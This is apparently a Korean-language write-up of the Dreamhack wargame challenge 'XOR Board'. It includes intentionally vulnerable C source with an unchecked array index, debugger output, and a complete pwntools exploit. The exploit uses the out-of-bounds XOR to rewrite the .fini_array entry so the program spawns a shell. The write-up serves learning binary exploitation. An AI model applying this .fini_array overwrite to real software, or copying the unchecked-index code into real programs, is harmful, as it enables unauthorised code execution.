---
title: "XOR Board writeup"
date: 2026-04-01 08:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, oob, no-relro, fini_array, dreamhack]
---

지금까지 워게임을 풀면서 처음으로 No RELRO인 문제를 발견했다.

## Analysis

### checksec
```
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

No RELRO!
`.init_array`, `.fini_array`, `.dynamic`, `.got`를 모두 덮어쓸 수 있다.

### Source Code
```c
// gcc -o main main.c -Wl,-z,norelro

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

uint64_t arr[64] = {0};

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
}

void print_menu() {
    puts("1. XOR two values");
    puts("2. Print one value");
    printf("> ");
}

void xor() {
    int32_t i, j;
    printf("(Enter i & j > )");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}

void print() {
    uint32_t i;
    printf("Enter i > ");
    scanf("%d", &i);
    printf("Value: %lx\n", arr[i]);
}

void win() {
    system("/bin/sh");
}

int main() {
    int option, i, j;

    initialize();
    while (1) {
        print_menu();
        scanf("%d", &option);
        if (option == 1) {
            xor();
        } else if (option == 2) {
            print();
        } else {
            break;
        }
    }

    return 0;
}
```

`xor()`을 보면 OOB 취약점이 존재한다. 인덱스에 음수를 포함한 임의의 값을 넣을 수 있으므로 원하는 임의의 주소에 XOR 연산이 가능하다.

## Vulnerability Analysis
```
pwndbg> start
...
pwndbg> elf
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End     Perm       Size  Name
    0x5555555542e0     0x5555555542fc      R--       0x1c  .interp
    0x555555554300     0x555555554330      R--       0x30  .note.gnu.property
    0x555555554330     0x555555554354      R--       0x24  .note.gnu.build-id
    0x555555554354     0x555555554374      R--       0x20  .note.ABI-tag
    0x555555554378     0x5555555543a8      R--       0x30  .gnu.hash
    0x5555555543a8     0x5555555544f8      R--      0x150  .dynsym
    0x5555555544f8     0x5555555545dc      R--       0xe4  .dynstr
    0x5555555545dc     0x5555555545f8      R--       0x1c  .gnu.version
    0x5555555545f8     0x555555554648      R--       0x50  .gnu.version_r
    0x555555554648     0x555555554738      R--       0xf0  .rela.dyn
    0x555555554738     0x5555555547c8      R--       0x90  .rela.plt
    0x555555555000     0x55555555501b      R-X       0x1b  .init
    0x555555555020     0x555555555090      R-X       0x70  .plt
    0x555555555090     0x5555555550a0      R-X       0x10  .plt.got
    0x5555555550a0     0x555555555100      R-X       0x60  .plt.sec
    0x555555555100     0x555555555495      R-X      0x395  .text
    0x555555555498     0x5555555554a5      R-X        0xd  .fini
    0x555555556000     0x555555556062      R--       0x62  .rodata
    0x555555556064     0x5555555560c0      R--       0x5c  .eh_frame_hdr
    0x5555555560c0     0x55555555620c      R--      0x14c  .eh_frame
    0x555555557210     0x555555557218      RW-        0x8  .init_array
    0x555555557218     0x555555557220      RW-        0x8  .fini_array
    0x555555557220     0x555555557410      RW-      0x1f0  .dynamic
    0x555555557410     0x555555557480      RW-       0x70  .got
    0x555555557480     0x555555557490      RW-       0x10  .data
    0x5555555574a0     0x5555555576c0      RW-      0x220  .bss
pwndbg> tele 0x555555557218
00:0000│ rcx r14 0x555555557218 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
01:0008│         0x555555557220 (_DYNAMIC) ◂— 1
02:0010│         0x555555557228 (_DYNAMIC+8) ◂— 0x6a /* 'j' */
03:0018│         0x555555557230 (_DYNAMIC+16) ◂— 0xc /* '\x0c' */
04:0020│         0x555555557238 (_DYNAMIC+24) ◂— 0x1000
05:0028│         0x555555557240 (_DYNAMIC+32) ◂— 0xd /* '\r' */
06:0030│         0x555555557248 (_DYNAMIC+40) ◂— 0x1498
07:0038│         0x555555557250 (_DYNAMIC+48) ◂— 0x19
pwndbg> vmmap 0x5555555551a0
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
      0x555555554000     0x555555555000 r--p     1000       0 deploy/main
►     0x555555555000     0x555555556000 r-xp     1000    1000 deploy/main +0x1a0
      0x555555556000     0x555555557000 r--p     1000    2000 deploy/main
```

`.fini_array`에는 `__do_global_dtors_aux`라는 정리 함수의 주소가 저장되어 있으며, 이 함수는 바이너리의 코드 세그먼트에 포함된다. 이 섹션에 저장된 주소는 프로그램 종료 시 `exit()` 내부에서 호출된다. `win()`과 `__do_global_dtors_aux`가 동일한 페이지에 있기 때문에 페이지 오프셋만 수정하여 `win()`이 대신 호출되도록 만들 수 있다.
```
pwndbg> p &win
$1 = (<text variable, no debug info> *) 0x5555555553ed <win>
```

`win()`의 오프셋은 `0x3ed`이고 `__do_global_dtors_aux`의 오프셋은 `0x1a0`이다.

## Exploit

XOR 계산을 수월하게 하기 위해 두 가지를 알아두면 좋다. 첫째로 XOR은 두 비트가 모두 1일 때 0이 된다는 점을 제외하면 OR 연산과 동일하다. 둘째로 이 프로그램에서 `arr`의 인덱스와 해당 원소를 나타내는 64비트 값에서 1로 설정된 비트의 번호가 항상 같다. 각 비트를 적절히 XOR하여 오프셋을 `0x3ed`로 바꿔준 뒤 메인 루프를 탈출시키면 쉘을 획득할 수 있다.

음수 인덱스로 `.fini_array`에 접근하기 위한 인덱스는 아래와 같이 구할 수 있다.
```
(.fini_array 주소 - arr 베이스 주소) / 8 = -85
```

아래는 전체 익스플로잇 코드이다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./deploy/main")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 17489)

    return r


def main():
    r = conn()

    v = [0, 2, 3, 6, 9]
    for i in v:
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"Enter i & j > ", f"-85 {i}".encode())

    r.sendlineafter(b"> ", b"-1")
    r.interactive()


if __name__ == "__main__":
    main()
```